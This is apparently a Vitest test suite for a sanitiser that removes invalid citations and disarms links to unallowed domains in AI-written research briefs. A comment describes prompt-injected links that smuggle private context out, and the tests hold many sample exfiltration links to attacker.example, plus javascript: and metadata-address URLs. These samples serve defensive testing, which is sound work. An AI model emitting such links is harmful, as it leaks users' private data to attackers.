// Citation hygiene: a [n] that survives must point at a real source, a range
// is never quietly re-attributed, and an invented URL is never clickable.
import { describe, expect, it } from "vitest";
import { cleanOutput, cleanOutputWithStats, stripInvalidCitations, unlinkUnknownUrls } from "../../src/research/citations";

describe("stripInvalidCitations", () => {
  it("drops out-of-range numbers in ',' and ';' lists", () => {
    expect(stripInvalidCitations("A [2, 9] and B [7].", 5)).toBe("A [2] and B.");
    expect(stripInvalidCitations("A [2; 9].", 5)).toBe("A [2].");
    expect(stripInvalidCitations("A [9; 12] here.", 5)).toBe("A here.");
    expect(stripInvalidCitations("Valid [1; 3] and [2, 4].", 5)).toBe("Valid [1; 3] and [2, 4].");
    expect(stripInvalidCitations("Zero [0] cited.", 5)).toBe("Zero cited.");
  });

  it("drops a range that reaches outside the sources instead of clamping it", () => {
    expect(stripInvalidCitations("Growth [2-8].", 3)).toBe("Growth.");
    expect(stripInvalidCitations("Growth [1, 2–8].", 3)).toBe("Growth [1].");
    expect(stripInvalidCitations("Growth [1-3].", 3)).toBe("Growth [1-3].");
    expect(stripInvalidCitations("Growth [3-1].", 3)).toBe("Growth [1–3].");
  });

  it("removes reference lines for sources that don't exist", () => {
    const md = "Text [1].\n\n## Sources\n- [1] Real report\n- [9] Invented report\n1. [8] Another invention\n[2] Real too";
    expect(stripInvalidCitations(md, 2)).toBe("Text [1].\n\n## Sources\n- [1] Real report\n[2] Real too");
  });

  it("leaves code, links and footnote-style definitions alone", () => {
    expect(stripInvalidCitations("Use `arr[9]` and\n```\nx[12]\n```", 3)).toBe("Use `arr[9]` and\n```\nx[12]\n```");
    expect(stripInvalidCitations("[9](https://example.org) and [9]: def", 3)).toBe("[9](https://example.org) and [9]: def");
  });
});

describe("unlinkUnknownUrls", () => {
  const allowed = ["research.example.org", "example.com"];

  it("turns markdown links and images on unknown domains into text", () => {
    expect(unlinkUnknownUrls("See [the report](https://fake.com/report) now.", allowed)).toBe("See the report now.");
    expect(unlinkUnknownUrls("![chart](https://fake.com/c.png)", allowed)).toBe("chart");
    expect(unlinkUnknownUrls("[ok](https://research.example.org/x)", allowed)).toBe("[ok](https://research.example.org/x)");
    expect(unlinkUnknownUrls("[sub](https://docs.example.com/x)", allowed)).toBe("[sub](https://docs.example.com/x)");
  });

  it("reduces bare and www. URLs on unknown domains to their host name so they can't be autolinked", () => {
    expect(unlinkUnknownUrls("See https://fake-report.com/x and www.madeup.io.", allowed)).toBe("See fake-report.com and madeup.io.");
    expect(unlinkUnknownUrls("Metadata at http://169.254.169.254/latest/meta-data/, really.", allowed)).toBe("Metadata at 169.254.169.254, really.");
    expect(unlinkUnknownUrls("<https://fake.com/a>", allowed)).toBe("fake.com");
    expect(unlinkUnknownUrls("A link [https://fake.com/a](https://fake.com/a).", allowed)).toBe("A link fake.com.");
    expect(unlinkUnknownUrls("(see https://fake.com/a)", allowed)).toBe("(see fake.com)");
  });

  it("keeps bare URLs on allowed domains, and doesn't touch code", () => {
    const md = "Source: https://research.example.org/eu and https://www.example.com/a. Code: `https://fake.com` stays.";
    expect(unlinkUnknownUrls(md, allowed)).toBe(md);
    expect(unlinkUnknownUrls("<https://research.example.org/x>", allowed)).toBe("<https://research.example.org/x>");
  });
});

// A link planted through prompt injection (e.g. a search snippet asking for a "dataset" link with private
// context in the query) must never stay clickable, whatever form its destination takes.
describe("unlinkUnknownUrls: only absolute http(s) links on allowed domains survive", () => {
  const allowed = ["research.example.org"];
  const unlink = (md: string) => unlinkUnknownUrls(md, allowed);

  it("reduces protocol-relative, scheme-only, backslash and other non-http(s) destinations to their text", () => {
    expect(unlink("See [the full dataset](//attacker.example/c?d=ACME-secret-pricing).")).toBe("See the full dataset.");
    expect(unlink("[source](https:attacker.example/p?d=ACME) and [ref](http:\\\\attacker.example\\x)")).toBe("source and ref");
    expect(unlink("[a](\\/\\/attacker.example/x) [b](https:\\/\\/attacker.example/x) [c](/relative) [d](page.html) [e]()")).toBe("a b c d e");
    expect(unlink("[x](javascript:alert(1)) [y](data:text/html,hi) [z](mailto:a@attacker.example?body=secret)")).toBe("x y z");
    expect(unlink("![pixel](//attacker.example/p.png?d=secret)")).toBe("pixel");
  });

  it("checks the host the browser would really use", () => {
    expect(unlink("[x](https://research.example.org\\@attacker.example/a)")).toBe("x");
    expect(unlink("[x](https://research.example.org&#64;attacker.example/a)")).toBe("x");
    expect(unlink("[x](https://user@research.example.org/a)")).toBe("x");
    expect(unlink("[x](https://research.example.org.attacker.example/a)")).toBe("x");
    expect(unlink("https://research.example.org@attacker.example/a")).toBe("attacker.example");
  });

  it("parses destinations the way the renderer does: <…>, titles, nested parentheses, a line break, code spans", () => {
    expect(unlink("[x](<//attacker.example/a b>) [y](//attacker.example \"t\") [z](//attacker.example/a((b)))")).toBe("x y z");
    expect(unlink("[x](\n//attacker.example/a\n)")).toBe("x");
    expect(unlink("[`code`](//attacker.example/c) and [x](//attacker.example/`a`)")).toBe("`code` and x");
    expect(unlink("[a [b x]](//one.example)(//attacker.example)")).toBe("a b x");
  });

  it("disarms reference-style links and autolinks to other hosts", () => {
    expect(unlink("Read [the dataset][d].\n\n[d]: //attacker.example/x?d=secret")).toBe("Read the dataset.\n\n\\[d]: //attacker.example/x?d=secret");
    // Once the definition is plain text, its <…> destination would be an autolink: disarmed too.
    expect(unlink("Read [the dataset][].\n\n[the dataset]: <https://attacker.example/x>")).toBe("Read the dataset.\n\n\\[the dataset]: attacker.example");
    expect(unlink("Growth [1].\n\n> [1]:\n> https:attacker.example/x")).toBe("Growth [1].\n\n> \\[1]:\n> https:attacker.example/x");
    expect(unlink("<https:attacker.example/x> <mailto:a@attacker.example>")).toBe("https:attacker.example/x mailto:a@attacker.example");
  });

  it("reduces a bare URL next to a backtick or backslash, or in a code span a table cell may break", () => {
    expect(unlink("\\`https://attacker.example/x")).toBe("\\` attacker.example");
    expect(unlink("``https://attacker.example/x`")).toBe("``attacker.example`");
    expect(unlink("| a | b |\n|---|---|\n| `x | https://attacker.example/y | z` |")).toBe("| a | b |\n|---|---|\n| `x | attacker.example | z` |");
    // Without a table the code span is code: GFM links nothing in it.
    expect(unlink("| `x | https://attacker.example/y | z` |")).toBe("| `x | https://attacker.example/y | z` |");
    expect(unlink("1https://attacker.example/x _www.attacker.example/y")).toBe("1attacker.example _attacker.example");
  });

  it("keeps allowed links, same-page anchors, allowed reference definitions and code", () => {
    const md = "[ok](https://research.example.org/x \"T\") [sec](#methods) [ref][r] <https://www.research.example.org/y>\n\n[r]: https://research.example.org/r";
    expect(unlink(md)).toBe(md);
    expect(unlink("```\n[x](//attacker.example)\n```\nafter [y](//attacker.example)")).toBe("```\n[x](//attacker.example)\n```\nafter y");
  });

  it("counts every unlinked destination once and is stable when run again", () => {
    const md = "[a](//attacker.example) [b][d] https://attacker.example/c\n\n[d]: //attacker.example/d";
    const first = cleanOutputWithStats(md, 0, allowed);
    expect(first.unlinkedUrls).toBe(3);
    expect(cleanOutputWithStats(first.text, 0, allowed)).toEqual({ text: first.text, removedCitations: 0, unlinkedUrls: 0 });
  });
});

// The renderer autolinks URL literals twice over: micromark links "http(s)://" and "www." as written, and
// remark-gfm searches the text again once backslash escapes and character references are decoded. A URL
// on another domain must come out as its bare host name in every such form (each output below was
// checked against react-markdown + remark-gfm and the exports' remark pipeline).
describe("unlinkUnknownUrls: no spelling of a bare URL stays clickable", () => {
  const allowed = ["research.example.org"];
  const unlink = (md: string) => unlinkUnknownUrls(md, allowed);

  it("finds URLs written with character references or backslash escapes", () => {
    expect(unlink("Download: &#104;ttps://attacker.example/c?d=ACME-secret")).toBe("Download: attacker.example");
    expect(unlink("https&#58;//attacker.example/c?d=1 and https&colon;//attacker.example/c")).toBe("attacker.example and attacker.example");
    expect(unlink("Download: https:&sol;&sol;attacker.example/c and https\\://attacker.example/c?d=1")).toBe("Download: attacker.example and attacker.example");
    expect(unlink("Mirror: www&#46;attacker.example/c?d=1 or www\\.attacker.example/c or &#119;ww.attacker.example/c")).toBe("Mirror: attacker.example or attacker.example or attacker.example");
    // Encoded, a URL is never kept, even on an allowed host.
    expect(unlink("x &#104;ttps://research.example.org/a")).toBe("x research.example.org");
  });

  it("finds www. and http(s):// after any punctuation, as GFM links them", () => {
    expect(unlink("See the export-www.attacker.example/c?d=1, a.www.attacker.example/c, a/www.attacker.example/c, a@www.attacker.example/c")).toBe(
      "See the export-attacker.example, a.attacker.example, a/attacker.example, a@ attacker.example"
    );
    expect(unlink("(www.attacker.example/c) *www.attacker.example/c* _www.attacker.example/c_ ~www.attacker.example/c~ x-https://attacker.example/c")).toBe(
      "(attacker.example) *attacker.example* _attacker.example_ ~attacker.example~ x-attacker.example"
    );
    expect(unlink("Data &amp;https://attacker.example/c and x&nbsp;www.attacker.example/c, x\\www.attacker.example/c")).toBe("Data &amp; attacker.example and x&nbsp; attacker.example, x\\ attacker.example");
    expect(unlink("1https://attacker.example/c a_https://attacker.example/d")).toBe("1attacker.example a_attacker.example");
  });

  it("reduces URLs that a stray backtick, or a code span with <, > or | in it, would leave live", () => {
    expect(unlink("Full dataset: `https://attacker.example/c?d=ACME-secret")).toBe("Full dataset: `attacker.example");
    expect(unlink("x \\`https://attacker.example/c and ``https://attacker.example/d`")).toBe("x \\` attacker.example and ``attacker.example`");
    // At HEAD these became links again: inline code with "<", ">" or "|" before the URL.
    expect(unlink("Significance `p < 0.05` was reported; dataset https://attacker.example/c?d=1")).toBe("Significance `p < 0.05` was reported; dataset attacker.example");
    expect(unlink("Use `a -> b`, `Map<K,V>` and `<div>`, then visit https://attacker.example/c")).toBe("Use `a -> b`, `Map<K,V>` and `<div>`, then visit attacker.example");
    expect(unlink("| col |\n|---|\n| `a | b` https://attacker.example/c |")).toBe("| col |\n|---|\n| `a | b` attacker.example |");
    // After a line that may open an HTML block, a fence is not certainly code.
    expect(unlink("<div>\n```\n\nhttps://attacker.example/c\n```")).toBe("<div>\n```\n\nattacker.example\n```");
  });

  it("leaves code the renderer certainly shows as code alone", () => {
    const md = "Use `https://fake.com/x`, `curl https://fake.com | jq` and ``x` https://fake.com/y``.\n\n```\nhttps://fake.com/z [x](//fake.com)\n```";
    expect(unlink(md)).toBe(md);
    expect(unlink("x`a`https://attacker.example/c")).toBe("x`a`attacker.example");
  });

  it("ends a URL where micromark starts another inside it", () => {
    // "?www." is only linked by the search of the decoded text, which micromark's own literal cuts short.
    expect(unlink("?www.research.example.org/#https://attacker.example/c?d=1")).toBe("?www.research.example.org/# attacker.example");
    expect(unlink("?www.research.example.org/(www.attacker.example/c?d=1")).toBe("?www.research.example.org/( attacker.example");
    expect(unlink("https://research.example.org/a\\<https://attacker.example/c>")).toBe("https://research.example.org/a\\ attacker.example");
  });

  it("reads a \"](…)\" that may not be a link as text", () => {
    expect(unlink("](https://research.example.org/<https://attacker.example/c?d=1)")).toBe("\\]");
    expect(unlink("[a [b](https://research.example.org/r)](https://research.example.org/<https://attacker.example/c)")).toBe("a [b](https://research.example.org/r)");
    expect(unlink("<HTTPS:attacker.example!|#> and <https://attacker.example/a|b>")).toBe("HTTPS:attacker.example!|# and attacker.example");
  });

  it("keeps a host only when it is an allowed domain as the browser parses it", () => {
    expect(unlink("https://research.example.org@attacker.example/a and https://research.example.org_/www.attacker.example/c")).toBe("attacker.example and research.example.org_");
    expect(unlink("?www.attacker.example(www.research.example.org/p")).toBe("?attacker.examplewww.research.example.org/p");
  });

  it("keeps allowed URLs and links exactly as written", () => {
    const md =
      "**https://research.example.org** and \"www.research.example.org\" and (https://research.example.org). Also https://research.example.org/a_(b), " +
      'https://research.example.org/r?u=https://other.example/x and [ok](https://research.example.org/x "T") <https://www.research.example.org/y> https://sub.research.example.org/z#a';
    expect(unlink(md)).toBe(md);
  });

  it("is stable when run again", () => {
    for (const md of [
      "?www.research.example.org/#https://attacker.example/c ``x https://attacker.example/d` &#104;ttps://attacker.example/e",
      "[a [b](https://research.example.org/r)](https://research.example.org/x)https://attacker.example/y",
      "| a |\n|---|\n| `x | https://attacker.example/y` | <https://research.example.org/a|https://attacker.example/b> |",
    ]) {
      const once = unlink(md);
      expect(unlink(once)).toBe(once);
    }
  });

  it("stays linear on adversarial input", () => {
    const n = 64_000;
    const fill = (unit: string) => unit.repeat(Math.ceil(n / unit.length)).slice(0, n);
    for (const md of [
      fill("]("),
      fill("[x](<"),
      fill('](a "'),
      "[".repeat(n / 8) + "a" + "](//e)".repeat(n / 8),
      "[".repeat(n / 4) + "x" + "][]".repeat(n / 4) + "\n\n[x]: //attacker.example",
      fill("&#104;"),
      fill("?www.research.example.org/"),
      fill("https://research.example.org/a|"),
      fill("```\n"),
    ]) {
      const t = performance.now();
      cleanOutput(md, 3, allowed);
      // Well under 50 ms here; the quadratic scan took seconds.
      expect(performance.now() - t).toBeLessThan(300);
    }
  });
});

describe("cleanOutputWithStats", () => {
  it("counts removed citations and unlinked URLs; cleanOutput returns the same text", () => {
    const md = [
      "# Brief",
      "",
      "Germany leads [1, 7] and the Nordics grow [2; 9]. See https://invented.example.net/study and [a page](https://fake.com/p).",
      "",
      "- [1] Real source",
      "- [8] Invented source",
    ].join("\n");
    const r = cleanOutputWithStats(md, 2, ["research.example.org"]);
    expect(r.removedCitations).toBe(3);
    expect(r.unlinkedUrls).toBe(2);
    expect(r.text).toBe(
      ["# Brief", "", "Germany leads [1] and the Nordics grow [2]. See invented.example.net and a page.", "", "- [1] Real source"].join("\n")
    );
    expect(cleanOutput(md, 2, ["research.example.org"])).toBe(r.text);
  });

  it("is idempotent and reports nothing for clean text", () => {
    const md = "Claim [1]. See `https://x.example` and https://research.example.org/a.";
    const once = cleanOutputWithStats(md, 1, ["research.example.org"]);
    expect(once).toEqual({ text: md, removedCitations: 0, unlinkedUrls: 0 });
    const dirty = "A [5] https://fake.com/x";
    const first = cleanOutput(dirty, 1, []);
    expect(cleanOutputWithStats(first, 1, [])).toEqual({ text: first, removedCitations: 0, unlinkedUrls: 0 });
  });
});
